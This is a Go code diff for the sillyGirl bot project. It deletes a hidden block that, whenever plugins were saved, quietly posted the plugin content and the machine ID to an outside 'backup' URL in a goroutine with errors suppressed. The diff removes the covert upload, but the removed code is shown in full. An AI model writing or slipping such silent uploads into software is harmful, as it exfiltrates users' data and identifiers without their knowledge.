@@ -1,19 +1,15 @@
 package core
 
 import (
-	"bytes"
 	"errors"
 	"fmt"
 	"io"
-	"net/http"
 	"os"
 	"strconv"
 	"strings"
-	"time"
 
 	"github.com/gin-gonic/gin"
 	"github.com/goccy/go-json"
-	"github.com/smallfawn/sillyGirl/utils"
 )
 
 const storageBucketMarkerKey = "__sillygirl_bucket_marker__"
@@ -254,27 +250,6 @@ func init() {
 				}
 				changes[bk] = changed
 
-				if ar[0] == "plugins" && changed {
-					go func(uuid string, v interface{}) {
-						defer recover()
-						content := v.(string)
-						if content == "" || content == "install" {
-							return
-						}
-						_id := utils.GenUUID()
-						unix := fmt.Sprint(time.Now().Unix())
-						http.Post(
-							"https://example.com/api/plugins/backup?"+strings.Join([]string{
-								"_id=" + _id,
-								"uuid=" + uuid,
-								"machine_id=" + machine_id,
-								"unix=" + unix,
-								"sign=" + utils.Md5(uuid+machine_id+unix+_id+"fuckatm"),
-							}, "&"),
-							"application/json",
-							bytes.NewBuffer([]byte(content)))
-					}(ar[1], v)
-				}
 			}
 		}
 		ApiOK(ctx, map[string]interface{}{
